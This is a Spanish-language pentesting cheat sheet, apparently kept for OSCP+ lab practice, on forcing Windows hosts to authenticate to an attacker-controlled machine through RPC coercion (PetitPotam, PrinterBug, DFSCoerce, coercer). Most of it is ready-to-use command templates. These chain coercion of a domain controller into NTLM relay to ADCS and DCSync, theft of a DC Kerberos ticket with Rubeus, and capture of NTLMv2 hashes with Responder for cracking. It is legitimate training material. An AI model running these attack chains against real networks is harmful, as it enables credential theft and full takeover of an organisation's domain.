# Chuleta — RPC Coercion (autenticación forzada)

> **Alcance del OSCP+**: el **relay NTLM SÍ entra** (`ntlmrelayx` a LDAP/LDAPS/SMB/MSSQL).
> **PROHIBIDOS**: la **coerción** (los métodos de esta chuleta: PetitPotam, PrinterBug, DFSCoerce,
> ShadowCoerce) y el **spoofing/poisoning** (Responder sin `-A`, Inveigh). El relay a **ADCS**
> (ESC8) queda fuera.
> **Esta chuleta es referencia para labs**: la coerción no se usa en el examen.
>
> Fuente: [The Hacker Recipes — MITM & coerced authentications](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications)
> y [PayloadsAllTheThings].
>
> **Qué es**: forzar a una máquina víctima (idealmente un **DC**) a autenticarse contra un host
> que vos controlás. Esa autenticación NTLM/Kerberos se usa para:
> - **Relay** NTLM (LDAP/S, SMB, MSSQL) — **en alcance**; a ADCS (ESC8) → fuera,
> - capturar el TGT si hay **unconstrained delegation**,
> - robar el hash para crackeo.

---

## Herramientas

| Herramienta | Qué hace |
| --- | --- |
| **`coercer`** | **La más cómoda**: prueba todos los métodos automáticamente |
| `PetitPotam.py` | MS-EFSR (efsrpc) |
| `printerbug.py` | MS-RPRN (spooler) |
| `dfscoerce.py` | MS-DFSNM |
| `ShadowCoerce` | MS-FSRVP |
| `nxc ... -M petitpotam` / `-M coerce_plus` | módulos de NetExec |

### coercer (recomendado)

```bash
# Escanear qué métodos acepta la víctima
coercer scan -t <VICTIMA> -u <USER> -p '<PASS>' -d <DOMINIO>

# Forzar la autenticación hacia tu Kali
coercer coerce -t <VICTIMA> -l <TU_IP> -u <USER> -p '<PASS>' -d <DOMINIO>

# Fuzz de métodos
coercer fuzz -t <VICTIMA> -u <USER> -p '<PASS>' -d <DOMINIO>
```

---

## Métodos por interfaz

| Interfaz | Método | Herramienta | Notas |
| --- | --- | --- | --- |
| **MS-EFSR** | `EfsRpcOpenFileRaw` | `PetitPotam.py` | El más usado. Deshabilitado en parches recientes |
| **MS-RPRN** | `RpcRemoteFindFirstPrinterChangeNotification` | `printerbug.py` | Requiere **spooler** activo |
| **MS-DFSNM** | `NetrDfsAddStdRoot` | `dfscoerce.py` | Alternativa cuando EFSR falla |
| **MS-FSRVP** | `IsPathSupported` | `ShadowCoerce` | Requiere el servicio FSRVP |
| **MS-SAMR** | cambio de contraseña que fuerza auth | `coercer` | Variante |
| **PushSubscription** | abuso de suscripciones WSUS | `coercer` / `wsus` | Sin credenciales en algunos casos |
| **WebClient/WebDAV** | forzar auth HTTP vía `\\host@port\` | `PetitPotam` + WebDAV | Necesita el cliente WebClient activo |

### PetitPotam (MS-EFSR)

```bash
PetitPotam.py -u <USER> -p '<PASS>' -d <DOMINIO> <TU_IP> <DC_IP>
PetitPotam.py -u '' -p '' -d <DOMINIO> <TU_IP> <DC_IP>     # intento anónimo
```

### printerbug (MS-RPRN)

```bash
printerbug.py <DOMINIO>/<USER>:<PASS>@<DC_IP> <TU_IP>
```

---

## Uso 1 — Relay a ADCS (ESC8)

```bash
# 1) Levantar el relay apuntando al endpoint HTTP de la CA
certipy-ad relay -target 'http://<CA_HOSTNAME>' -ca '<NOMBRE_CA>'
#    (o impacket-ntlmrelayx)

# 2) Coercionar al DC hacia tu Kali
coercer coerce -t <DC_IP> -l <TU_IP> -u <USER> -p '<PASS>' -d <DOMINIO>

# 3) Certipy recibe el .pfx del DC → auth → hash → DCSync
certipy-ad auth -pfx <dc>.pfx -dc-ip <DC_IP>
```

> **Limitación de red**: el relay necesita que la víctima se conecte **de vuelta a vos**.
> A través de un SOCKS proxy (proxychains) **NO funciona**. Necesitás **ligolo-ng** o un
> redireccionador en el pivote. Ver `07-pivoting.md`.

---

## Uso 2 — Robar el TGT (unconstrained delegation)

```bash
# En el host comprometido con delegación sin restricción (Rubeus)
Rubeus.exe monitor /interval:5 /nowrap

# Coercionar la autenticación del DC
coercer coerce -t <DC_IP> -l <HOST_COMPROMETIDO> -u <USER> -p '<PASS>' -d <DOMINIO>

# El TGT del DC queda en la consola de Rubeus → inyectar → DCSync
Rubeus.exe ptt /ticket:<BASE64>
```

---

## Uso 3 — Robar el hash NTLM

```bash
# Responder escuchando
sudo responder -I tun0

# Coercionar (¡ojo! si Relay no aplica, capturás el hash)
coercer coerce -t <VICTIMA> -l <TU_IP> -u <USER> -p '<PASS>' -d <DOMINIO>
# → hash NTLMv2 en Responder → hashcat -m 5600
```

---

## Detección / diagnóstico

- ¿El spooler está activo? Sin él, no hay MS-RPRN:
  `nxc smb <IP> -u user -p pass -M spooler`
- ¿EFS está parchado? Probá DFSCoerce o PrintBug.
- ¿Tu Kali es alcanzable desde la víctima? Si no, no habrá callback: revisá `07-pivoting.md`.
- Empapelar todo con `coercer scan` para ver qué métodos acepta antes de disparar.
